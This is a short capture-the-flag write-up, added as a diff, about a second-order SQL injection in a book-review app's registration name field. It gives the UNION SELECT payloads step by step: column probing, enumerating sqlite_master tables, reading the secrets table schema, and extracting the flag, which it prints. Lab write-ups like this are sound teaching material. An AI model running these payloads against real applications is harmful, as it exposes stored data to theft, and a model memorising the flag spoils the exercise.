@@ -1,0 +1,22 @@
+The vulnerable part is in the registration phase. The name is not sanitized nor checked but put directly inside the query
+
+This is the query that let me know something strange may happens
+
+' UNION SELECT 1,2,3,4,5,6,7,8 -- -  the result of the query is in the my reviews page  the following query, let you know the available tables:  ' UNION SELECT 1,2,3,4,5,6,7,name FROM sqlite_master WHERE type='table' -- -
+
+These are the tables:
+Books
+Reviews
+secrets
+sqlite_sequence
+Users
+
+The following query let me know the columns of the secret table:
+' UNION SELECT 1,2,3,4,5,6,7,sql FROM sqlite_master WHERE type='table' AND name='secrets' -- - 
+  which are the following:
+Id
+Flag 
+
+The correct query to obtain the flag:  ' UNION SELECT 1,2,3,4,5,6,7,flag FROM secrets - 
+  which is: offsec{2nd_0rder_sqli_vM2PUtkZlB4Tqp5W}
+
